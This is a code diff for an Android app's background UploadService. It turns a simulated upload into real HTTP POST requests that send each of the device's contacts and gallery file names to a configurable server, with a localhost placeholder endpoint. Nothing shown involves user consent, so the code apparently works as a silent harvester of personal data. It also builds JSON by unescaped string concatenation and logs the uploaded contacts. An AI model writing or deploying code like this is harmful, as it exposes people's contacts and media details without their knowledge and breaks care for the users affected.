@@ -1,5 +1,7 @@
 package com.phc.serviceapp;
 
+import static android.content.ContentValues.TAG;
+
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
@@ -8,9 +10,16 @@ import android.net.Uri;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
+import android.util.Log;
+
 import java.io.File;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
+
 
 public class UploadService extends Service {
 
@@ -58,19 +67,60 @@ public class UploadService extends Service {
     }
 
     private void uploadToServer(List<String> contacts, List<String> galleryFiles) {
-        // Simulate upload process
+        String serverUrl = "http://127.0.0.1:8080/upload"; // Change this to your endpoint
+
         for (String contact : contacts) {
-            System.out.println("Uploading contact: " + contact);
+            try {
+                // Create JSON payload for contact
+                String payload = "{\"type\":\"contact\",\"data\":\"" + contact + "\"}";
+                sendPostRequest(serverUrl, payload);
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to upload contact: " + contact, e);
+            }
         }
 
         for (String filePath : galleryFiles) {
-            System.out.println("Uploading file: " + new File(filePath).getName());
+            try {
+                // Create JSON payload for file
+                String payload = "{\"type\":\"file\",\"data\":\"" + new File(filePath).getName() + "\"}";
+                sendPostRequest(serverUrl, payload);
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to upload file: " + filePath, e);
+            }
         }
     }
+
+    private void sendPostRequest(String serverUrl, String payload) throws IOException {
+        URL url = new URL(serverUrl);
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("POST");
+        connection.setRequestProperty("Content-Type", "application/json");
+        connection.setDoOutput(true);
+
+        // Write payload
+        try (OutputStream os = connection.getOutputStream()) {
+            byte[] input = payload.getBytes("utf-8");
+            os.write(input, 0, input.length);
+        }
+
+        // Read response
+        int responseCode = connection.getResponseCode();
+        if (responseCode == HttpURLConnection.HTTP_OK) {
+            Log.d(TAG, "Upload successful: " + payload);
+        } else {
+            Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode);
+        }
+    }
+
 
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
+
+
+
+
+
 }
 
